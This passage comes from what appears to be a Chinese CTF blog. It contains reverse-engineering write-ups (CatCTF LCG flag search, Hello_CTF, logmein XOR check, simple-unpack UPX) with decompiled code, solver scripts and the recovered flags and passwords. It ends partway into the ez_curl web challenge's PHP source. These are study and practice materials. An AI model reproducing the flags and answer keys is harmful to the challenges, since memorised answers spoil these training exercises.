<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">50</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">  dword_E120[i] ^= sub_62B5();</span><br><span class="line">  <span class="keyword">if</span>(sub_62E3(dword_E120[i]))</span><br><span class="line">     flag[i] = dword_E120[i] &amp; <span class="number">0x7F</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">     flag[i] = <span class="number">32</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的E_120数据如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:000000000000E120 dword_E120      dd 27FBh, 27A4h, 464Eh, 0E36h, 7B70h, 5E7Ah, 1A4Ah, 45C1h</span><br><span class="line">.data:000000000000E120                                         ; DATA XREF: sub_6314+5C↑o</span><br><span class="line">.data:000000000000E120                                         ; sub_6314+7A↑o ...</span><br><span class="line">.data:000000000000E120                 dd 2BDFh, 23BDh, 3A15h, 5B83h, 1E15h, 5367h, 50B8h, 20CAh</span><br><span class="line">.data:000000000000E120                 dd 41F5h, 57D1h, 7750h, 2ADFh, 11F8h, 9BBh, 5724h, 7374h</span><br><span class="line">.data:000000000000E120                 dd 3CE6h, 646Eh, 10Ch, 6E10h, 64F4h, 3263h, 3137h, 0B8h</span><br><span class="line">.data:000000000000E120                 dd 229Ch, 7BCDh, 73BDh, 480Ch, 14DBh, 68B9h, 5C8Ah, 1B61h</span><br><span class="line">.data:000000000000E120                 dd 6C59h, 5707h, 9E6h, 1FB9h, 2AD3h, 76D4h, 3113h, 7C7Eh</span><br><span class="line">.data:000000000000E120                 dd 11E0h, 6C70h</span><br></pre></td></tr></table></figure>

<p>sub_62b5()代码如下，这里对dword_E1E8进行了变换，dword_E1E8的值为1106h</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_62B5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  dword_E1E8 = <span class="number">1103515245</span> * dword_E1E8 + <span class="number">12345</span>; <span class="comment">//1106h</span></span><br><span class="line">  <span class="keyword">return</span> (dword_E1E8 &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x7FFF</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_62E3()代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">sub_62E3</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BOOL8 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (a1 &amp; <span class="number">0x7F</span>u) &lt;= <span class="number">0x7E</span> )</span><br><span class="line">    result = (a1 &amp; <span class="number">0x7F</span>u) &gt; <span class="number">0x20</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据上面的分析理清流程：</p>
<ul>
<li>dword_E120[i] ^&#x3D; sub_62B5();</li>
<li>if(sub_62E3(dword_E120[i]))<br> flag[i] &#x3D; dword_E120[i] &amp; 0x7F;<br>  else<br> flag[i] &#x3D; 32;</li>
<li>对上面两个步骤进行循环50次</li>
</ul>
<p>逆向代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">//在ida里面点开dword_E1E8会发现初始值为dword_E1E8</span></span><br><span class="line"><span class="keyword">int</span> dword_E1E8 = <span class="number">0x1106</span>;</span><br><span class="line"><span class="comment">//同理，ida里也能看到dword_E120的初始值</span></span><br><span class="line"><span class="keyword">int</span> dword_E120[<span class="number">50</span>]=&#123;<span class="number">0x27fb</span>, <span class="number">0x27a4</span>, <span class="number">0x464e</span>, <span class="number">0x0e36</span>, <span class="number">0x7b70</span>, <span class="number">0x5e7a</span>, <span class="number">0x1a4a</span>, <span class="number">0x45c1</span>, <span class="number">0x2bdf</span>, <span class="number">0x23bd</span>, <span class="number">0x3a15</span>, <span class="number">0x5b83</span>, <span class="number">0x1e15</span>, <span class="number">0x5367</span>, <span class="number">0x50b8</span>, <span class="number">0x20ca</span>, <span class="number">0x41f5</span>, <span class="number">0x57d1</span>, <span class="number">0x7750</span>, <span class="number">0x2adf</span>, <span class="number">0x11f8</span>, <span class="number">0x09bb</span>, <span class="number">0x5724</span>, <span class="number">0x7374</span>, <span class="number">0x3ce6</span>, <span class="number">0x646e</span>, <span class="number">0x010c</span>, <span class="number">0x6e10</span>, <span class="number">0x64f4</span>, <span class="number">0x3263</span>, <span class="number">0x3137</span>, <span class="number">0x00b8</span>, <span class="number">0x229c</span>, <span class="number">0x7bcd</span>, <span class="number">0x73bd</span>, <span class="number">0x480c</span>, <span class="number">0x14db</span>, <span class="number">0x68b9</span>, <span class="number">0x5c8a</span>, <span class="number">0x1b61</span>, <span class="number">0x6c59</span>, <span class="number">0x5707</span>, <span class="number">0x09e6</span>, <span class="number">0x1fb9</span>, <span class="number">0x2ad3</span>, <span class="number">0x76d4</span>, <span class="number">0x3113</span>, <span class="number">0x7c7e</span>, <span class="number">0x11e0</span>, <span class="number">0x6c70</span>&#125;;</span><br><span class="line"><span class="comment">//原封不动抄下来就好了</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_62B5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  dword_E1E8 = <span class="number">1103515245</span> * dword_E1E8 + <span class="number">12345</span>;</span><br><span class="line">  <span class="keyword">return</span> (dword_E1E8 &gt;&gt; <span class="number">10</span>) &amp; <span class="number">0x7FFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这块是拿来算输出数字n需要多少个字符的。个位数0，十位数1，百位数2……以此类推。至于为什么和一般理解的不一样，我也不太清楚，自己做了个实验发现的</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">llog</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n /= <span class="number">10</span>)a++;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这个函数我没有特别放出来，反正这里也是照抄的</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_62E3</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (a1 &amp; <span class="number">0x7F</span>u) &lt;= <span class="number">0x7E</span> )</span><br><span class="line">    result = (a1 &amp; <span class="number">0x7F</span>u) &gt; <span class="number">0x20</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//count代表那个不停自增的dword_108E0</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">//这里结合 函数，本来应该是dword_E120[a3-5]。a3对应到main函数的调用是循环索引l，还挺麻烦的。其实只需要把鼠标悬停在dword_E120上，就能发现它的大小是50，直接这么设定就好了。一个偷懒的方法，很多情况还是要动调确定</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++)&#123;</span><br><span class="line">            dword_E120[i]^=<span class="built_in">sub_62B5</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="comment">//计算printf的返回值，更改dword_E1E8,每10倍增加一个位数</span></span><br><span class="line">        dword_E1E8+=<span class="number">42</span>+<span class="built_in">llog</span>(count);</span><br><span class="line">        <span class="keyword">if</span>(count % <span class="number">1000000</span> == <span class="number">0</span> )&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Count:%d\n&quot;</span>,count);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//flag代表off_FA88</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> flag[<span class="number">51</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++)&#123;</span><br><span class="line">            <span class="comment">//根据出题人所说，出题时循环次数为705980581，但是线性同余随机数算法出现了循环导致在100427942就出现了flag，若只考虑数组的最低字节，能在100001958得到flag</span></span><br><span class="line">            <span class="comment">// Loop: 100427942</span></span><br><span class="line">            <span class="comment">// if((dword_E120[i] &amp; 0xff00))&#123;</span></span><br><span class="line">            <span class="comment">//     break;</span></span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            <span class="comment">// Loop: 100001958</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">sub_62E3</span>(dword_E120[i]))&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            flag[i]=dword_E120[i]&amp;<span class="number">0xff</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(<span class="string">&quot;CatCTF&quot;</span>,flag,<span class="number">6</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(flag);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Count:%d\n&quot;</span>,count);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>-CTF -Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Reverse系列之Hello_CTF</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8BHello_CTF/</url>
    <content><![CDATA[<h1 id="【攻防世界】Reverse系列之Hello-CTF"><a href="#【攻防世界】Reverse系列之Hello-CTF" class="headerlink" title="【攻防世界】Reverse系列之Hello_CTF"></a>【攻防世界】Reverse系列之Hello_CTF</h1><p>程序运行如下：</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8BHello_CTF/image-20231110105827511.png" class title="image-20231110105827511">

<p>反汇编获取其主函数代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+0h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+0h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> Buffer[<span class="number">2</span>]; <span class="comment">// [esp+12h] [ebp-5Eh] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v9[<span class="number">20</span>]; <span class="comment">// [esp+14h] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v10[<span class="number">32</span>]; <span class="comment">// [esp+28h] [ebp-48h] BYREF</span></span><br><span class="line">  __int16 v11; <span class="comment">// [esp+48h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [esp+4Ah] [ebp-26h]</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">36</span>]; <span class="comment">// [esp+4Ch] [ebp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(v13, <span class="string">&quot;437261636b4d654a757374466f7246756e&quot;</span>);</span><br><span class="line">  <span class="comment">//为v13赋值</span></span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )<span class="comment">//进入循环</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="keyword">sizeof</span>(v10)); <span class="comment">//v10=0</span></span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    v12 = <span class="number">0</span>;</span><br><span class="line">    sub_40134B(aPleaseInputYou, v6);<span class="comment">//</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v9); <span class="comment">//输入值</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v9) &gt; <span class="number">0x11</span> ) <span class="comment">//长度小于0x11,即17</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">17</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v9[i]; </span><br><span class="line">      <span class="keyword">if</span> ( !v4 )  <span class="comment">//v4!=0</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">sprintf</span>(Buffer, <span class="string">&quot;%x&quot;</span>, v4);<span class="comment">//将v4以16进制保存在buffer中</span></span><br><span class="line">      <span class="built_in">strcat</span>(v10, Buffer);<span class="comment">//v10=buffer</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v10, v13) ) <span class="comment">//比较v10和v13，相等则成功</span></span><br><span class="line">      sub_40134B(aSuccess, v7); <span class="comment">//输出success</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_40134B(aWrong, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_40134B(aWrong, v7);</span><br><span class="line">  result = --Stream._cnt;</span><br><span class="line">  <span class="keyword">if</span> ( Stream._cnt &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> _filbuf(&amp;Stream);</span><br><span class="line">  ++Stream._ptr;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码大概意思就是将**”437261636b4d654a757374466f7246756e”**这一串十六进制数转换为字符串进行判断，所以转换后的字符串就是flag</p>
<p>逆向代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">hex_str = &quot;437261636b4d654a757374466f7246756e&quot;  # 十六进制字符串</span><br><span class="line">bytes_arr = binascii.unhexlify(hex_str)  # 转换为字节串  </span><br><span class="line">str_result = bytes_arr.decode(&#x27;utf-8&#x27;)  # 将字节串转换为字符串  </span><br><span class="line">print(str_result)  # 输出结果：hello world</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>-CTF -Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Reverse系列之logmein</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8Blogmein/</url>
    <content><![CDATA[<h1 id="【攻防世界】Reverse系列之logmein"><a href="#【攻防世界】Reverse系列之logmein" class="headerlink" title="【攻防世界】Reverse系列之logmein"></a>【攻防世界】Reverse系列之logmein</h1><p>该文件需要让你输入密码进行判断，运行结果如下</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8Blogmein/image-20231128101817886.png" class title="image-20231128101817886">

<p>对其进行安全机制检查，只有NX开启的</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8Blogmein/image-20231128101912071.png" class title="image-20231128101912071">

<p>是一个ELF64文件</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8Blogmein/image-20231128102013998.png" class title="image-20231128102013998">

<p>我们使用IDA反汇编打开其程序，然后对main函数进行反汇编获取其伪代码，结果如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+3Ch] [rbp-54h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">36</span>]; <span class="comment">// [rsp+40h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+64h] [rbp-2Ch]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+68h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">28</span>]; <span class="comment">// [rsp+70h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+8Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v8, <span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>); <span class="comment">//v8=&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span></span><br><span class="line">  v7 = <span class="number">0x65626D61726168</span>LL;</span><br><span class="line">  v6 = <span class="number">7</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the RC3 secure password guesser.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;To continue, you must enter the correct password.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your guess: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%32s&quot;</span>, s);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);          <span class="comment">//v3为输入长度</span></span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="built_in">strlen</span>(v8) )    <span class="comment">//strlen(v8)=18</span></span><br><span class="line">    sub_4007C0();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="built_in">strlen</span>(v8) )</span><br><span class="line">      sub_4007C0();</span><br><span class="line">    <span class="keyword">if</span> ( s[i] != (<span class="keyword">char</span>)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )</span><br><span class="line">      sub_4007C0();</span><br><span class="line">  &#125;</span><br><span class="line">  sub_4007F0();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面两个函数sub_4007c0()和sub_4007F0()代码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">sub_4007C0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Incorrect password!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;   <span class="comment">//错误输入</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">sub_4007F0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You entered the correct password!\nGreat job!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125; <span class="comment">//正确输入</span></span><br></pre></td></tr></table></figure>

<p>所以要想通过判断，要满足以下条件</p>
<ul>
<li>输入字符长度等于18</li>
<li>s[i] &#x3D;&#x3D;(char)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i])</li>
</ul>
<p>这里需要注意的是v7转换为字符串为<strong>ebmarah</strong>只有7个字节，但要与后面v818个字符想计算的话自然满足不了的，所以需要对v7进行处理，即循环将其补齐成18个字符，<strong>v7&#x3D;harambeharambehara</strong>(v7是小端模式，字符串读取是从高字节向低字节读，但在栈中存取则是相反的)</p>
<p>下面编写代码反推获取正确的输入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v7 = <span class="string">&quot;harambeharambehara&quot;</span></span><br><span class="line">v8= <span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span></span><br><span class="line">s = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    s += <span class="built_in">chr</span>((<span class="built_in">ord</span>(v7[i])) ^ <span class="built_in">ord</span>(v8[i]))</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>

<p>得到<strong>RC3-2016-XORISGUD</strong></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>-CTF -Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Reverse系列之simple-unpack</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8Bsimple-unpack/</url>
    <content><![CDATA[<h1 id="【攻防世界】Reverse系列之simple-unpack"><a href="#【攻防世界】Reverse系列之simple-unpack" class="headerlink" title="【攻防世界】Reverse系列之simple-unpack"></a>【攻防世界】Reverse系列之simple-unpack</h1><p>打开附件，该ELF文件全是乱码，可以搜索的到flag字段，但是其中有乱码无法确定真实字符串</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8Bsimple-unpack/image-20231124173316853.png" class title="image-20231124173316853">

<p>根据题目信息，该文件是被加壳处理了的，我们使用工具查询其使用的加壳类型，如下图所示可以看到该文件被UPX压缩保护</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8Bsimple-unpack/image-20231124173128982.png" class title="image-20231124173128982">

<p><strong>什么是UPX呢？</strong></p>
<p>UPX 是一款先进的可执行程序文件压缩器。压缩过的可执行文件体积缩小50%-70% ，这样减少了磁盘占用空间、网络上传下载的时间和其它分布以及存储费用。 通过 UPX 压缩过的程序和程序库完全没有功能损失，和压缩之前一样可正常地运行。对于支持的大多数格式没有运行时间或内存的不利后果。它也是一个压缩壳，将文件源码保护起来，使其不容易破解。</p>
<p>所以要想获取程序源码，需要先对其进行脱壳处理。根据查壳工具提示，这里使用github上的upx.exe对其进行脱壳处理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upx.exe -d simple-unpack</span><br></pre></td></tr></table></figure>

<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8Bsimple-unpack/image-20231124174652892.png" class title="image-20231124174652892">

<p>此时再用查壳工具查看，已脱壳成功</p>
<p><strong><img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8Bsimple-unpack/image-20231124174941848.png" class title="image-20231124174941848"></strong></p>
<p>接着我们再查看程序在字节视图下的内容，寻找flag字符串</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8Bsimple-unpack/image-20231124175137083.png" class title="image-20231124175137083">

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Upx_1s_n0t_a_d3liv3r_c0mp4ny&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>-CTF -Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Web系列之ez_curl</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Web%E7%B3%BB%E5%88%97%E4%B9%8Bez_curl/</url>
    <content><![CDATA[<h1 id="【攻防世界】Web系列之ez-curl"><a href="#【攻防世界】Web系列之ez-curl" class="headerlink" title="【攻防世界】Web系列之ez_curl"></a>【攻防世界】Web系列之ez_curl</h1><p>打开题目发现，代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://back-end:3000/flag?&#x27;</span>;</span><br><span class="line"><span class="variable">$input</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$headers</span> = (<span class="keyword">array</span>)json_decode(<span class="variable">$input</span>)-&gt;headers;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$headers</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$offset</span> = stripos(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="string">&#x27;:&#x27;</span>); </span><br><span class="line">    <span class="variable">$key</span> = substr(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="variable">$offset</span>);</span><br><span class="line">    <span class="variable">$value</span> = substr(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="variable">$offset</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$key</span>, <span class="string">&#x27;admin&#x27;</span>) &gt; -<span class="number">1</span> &amp;&amp; stripos(<span class="variable">$value</span>, <span class="string">&#x27;true&#x27;</span>) &gt; -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;try hard&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$params</span> = (<span class="keyword">array</span>)json_decode(<span class="variable">$input</span>)-&gt;params;</span><br><span class="line"><span class="variable">$url</span> .= http_build_query(<span class="variable">$params</span>);</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&#x27;&amp;admin=false&#x27;</span>;</span><br><span class="line"><span class="variable">$ch</span> = curl_init();</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$headers</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_TIMEOUT_MS, <span class="number">5000</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_NOBODY, <span class="literal">FALSE</span>);</span><br><span class="line"><span class="variable">$result</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="keyword">try</span> hard1</span><br></pre></td></tr></table></figure>

<p>我们先来分析下代码吧，php代码看着挺难受的</p>
